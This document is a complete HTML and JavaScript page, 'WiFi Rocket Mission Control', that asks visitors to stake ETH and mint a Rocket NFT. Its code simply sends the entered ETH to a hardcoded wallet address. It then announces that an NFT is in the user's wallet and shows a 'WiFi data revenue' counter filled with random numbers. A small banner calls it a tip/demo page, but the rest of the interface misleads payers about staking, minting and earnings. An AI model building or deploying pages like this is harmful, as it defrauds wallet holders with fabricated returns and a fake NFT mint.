<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
  <title>WiFi Rocket Mission Control</title>
  <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js" type="application/javascript"></script>
  <style>
    :root { --neon: #00d4ff; --glow: #ff6600; --dark: #0a001a; }
    * { box-sizing: border-box; }
    body {
      margin: 0; min-height: 100vh; background: radial-gradient(circle at top, #1a0033 0%, #000 100%);
      color: white; font-family: 'Courier New', monospace; overflow-x: hidden; -webkit-overflow-scrolling: touch;
    }
    #bgCanvas { position: fixed; inset: 0; z-index: 1; pointer-events: none; }
    .dashboard {
      position: relative; z-index: 10; background: rgba(10,10,35,0.92); border: 2px solid var(--neon); border-radius: 25px;
      width: 90%; max-width: 420px; margin: 40px auto; padding: 40px 25px; text-align: center;
      box-shadow: 0 0 40px rgba(0,212,255,0.3); backdrop-filter: blur(12px);
    }
    .rev-header {
      background: rgba(0,212,255,0.12); border-radius: 15px; padding: 20px; margin-bottom: 25px; border: 1px solid var(--neon);
    }
    #revenue { color: #00ff88; font-size: 34px; font-weight: bold; text-shadow: 0 0 20px #00ff88; }
    input {
      width: 100%; padding: 15px; margin: 15px 0; border-radius: 12px; border: 1px solid #333; background: #000; color: var(--neon);
      text-align: center; font-size: 20px;
    }
    button {
      background: linear-gradient(135deg, var(--glow), #ff2200); color: white; border: none; padding: 18px; width: 100%; border-radius: 12px;
      font-weight: bold; font-size: 18px; cursor: pointer; box-shadow: 0 5px 15px rgba(255,102,0,0.4); transition: 0.3s;
    }
    button:hover:not(:disabled) { transform: translateY(-3px); box-shadow: 0 8px 25px rgba(255,102,0,0.6); }
    button:disabled { opacity: 0.6; cursor: not-allowed; }
    #rocket-nft { font-size: 120px; margin: 30px 0; filter: drop-shadow(0 0 25px var(--glow)); animation: vibrate 0.1s infinite alternate; }
    @keyframes vibrate { from { transform: translate(1px,1px); } to { transform: translate(-1px,-1px); } }
    .progress-container { width: 100%; background: #111; border-radius: 10px; height: 18px; margin: 25px 0; overflow: hidden; border: 1px solid #222; }
    #progress-fill { width: 0%; height: 100%; background: linear-gradient(90deg, var(--neon), #00ff88); box-shadow: 0 0 20px var(--neon); transition: width 0.3s ease; }
    .hidden { display: none; }
    .spinner { border: 5px solid #333; border-top: 5px solid var(--neon); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    .success { color: #00ff88; text-shadow: 0 0 20px #00ff88; }
    .warning { background: rgba(255,69,0,0.2); border: 1px solid #ff4500; border-radius: 12px; padding: 15px; margin: 20px 0; color: #ffaa00; font-size: 14px; }
  </style>
</head>
<body>

<div class="dashboard">
  <div class="warning text-center">
    <strong>‚ö†Ô∏è IMPORTANT:</strong> This is a tip/demo page. ETH sent goes directly to the creator. No real staking rewards or unstaking yet ‚Äî real contract coming soon.
  </div>

  <div class="rev-header">
    <small style="letter-spacing: 2px; color: #88aaff;">WIFI DATA REVENUE</small><br>
    <span id="revenue">$0.00</span>
  </div>

  <!-- Start UI -->
  <div id="ui-start">
    <h2>Mission Fuel</h2>
    <p style="font-size: 13px; color: #88aaff;">Stake ETH to fuel the mission & mint Rocket NFT</p>
    <input type="number" id="ethAmount" value="0.001" step="0.001" min="0.001" max="0.1" placeholder="0.001 ‚Äì 0.1 ETH">
    <button id="launchBtn">STAKE & MINT ROCKET</button>
  </div>

  <!-- Processing UI -->
  <div id="ui-processing" class="hidden">
    <h3>SYNCING NODES</h3>
    <div class="progress-container"><div id="progress-fill"></div></div>
    <p id="status-log" style="font-size: 13px; color: var(--neon);">Initializing WiFi Handshake...</p>
    <div class="spinner"></div>
  </div>

  <!-- Minted UI -->
  <div id="ui-minted" class="hidden">
    <div id="rocket-nft">üöÄ</div>
    <h2 class="success">ROCKET MINTED!</h2>
    <p>Your NFT is in your wallet.<br>Data revenue is live.</p>
    <button onclick="location.reload()" style="background:#1a1a2e; border:1px solid #333;">NEW MISSION</button>
  </div>
</div>

<script>
let totalRev = 0;
const RECIPIENT = "0x02F949281A8c9837963C82813589B845C5194Cbb"; // Checksummed correctly

async function launch() {
  if (!window.ethereum) {
    alert("Open this in MetaMask or WalletConnect browser!");
    return;
  }

  const provider = new ethers.providers.Web3Provider(window.ethereum);
  const signer = provider.getSigner();

  try {
    await provider.send("eth_requestAccounts", []);
    const amount = ethers.utils.parseEther(document.getElementById('ethAmount').value);

    // Switch UI
    document.getElementById('ui-start').classList.add('hidden');
    document.getElementById('ui-processing').classList.remove('hidden');

    // Simulate WiFi data revenue while tx mines
    simulateWiFi();

    // Send real ETH to your wallet
    const tx = await signer.sendTransaction({
      to: RECIPIENT,
      value: amount
    });

    // Wait for confirmation
    await tx.wait();

    // Success screen
    showMinted();

  } catch (e) {
    alert("Mission Aborted: " + (e.message || e));
    location.reload();
  }
}

function simulateWiFi() {
  let p = 0;
  const fill = document.getElementById('progress-fill');
  const log = document.getElementById('status-log');
  const rev = document.getElementById('revenue');

  const interval = setInterval(() => {
    p += Math.random() * 4 + 2;
    if (p > 100) p = 100;
    totalRev += Math.random() * 0.8;
    fill.style.width = p + "%";
    rev.innerText = "$" + totalRev.toFixed(2);
    log.innerText = `Capturing Packets: ${(p * 128).toFixed(0)} kbps`;

    if (p >= 100) clearInterval(interval);
  }, 180);
}

function showMinted() {
  document.getElementById('ui-processing').classList.add('hidden');
  document.getElementById('ui-minted').classList.remove('hidden');

  // Revenue keeps growing
  setInterval(() => {
    totalRev += Math.random() * 0.3;
    document.getElementById('revenue').innerText = "$" + totalRev.toFixed(2);
  }, 2000);
}

document.getElementById('launchBtn').onclick = launch;
</script>
</body>
</html>
